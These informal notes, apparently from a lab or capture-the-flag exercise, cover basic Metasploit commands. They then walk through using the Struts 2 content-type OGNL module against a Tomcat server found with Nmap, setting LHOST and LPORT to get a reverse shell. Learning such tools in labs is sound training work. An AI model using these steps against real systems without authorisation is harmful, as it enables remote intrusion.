type following command to start metasploit
* msfconsole

command for searching any modules 
* search iis

we can select a module by using this command
* use module_name

once module is selected we can view it's option 
* show options

to list all different payloads for all platforms 
* show playloads

to set payload we use following command 
* set payload payload_name

to run module, we simply execute 
* run

            ::Exploiting Using Metasploit::

   Nmap reveals a web service running on port 80/tcp, identified as Apache Tomcat/Coyote JSP engine 1.1. When we connect to the web server, we are redirected to /showcase.action.

Googling for the terms "apache" and "showcase.action" confirms that the server is probably running "Struts 2".   

run msfconsole 
then > search Struts 2
finde this module on number 6 > multi/http/struts2_content_type_ognl
msf6 > use 6 or multi/http/struts2_content_type_ognl
msf6 > show options
set > rhosts > rport >  targeturi

for reverse shell

set lhost tun0 or local_ip
set lport 44444

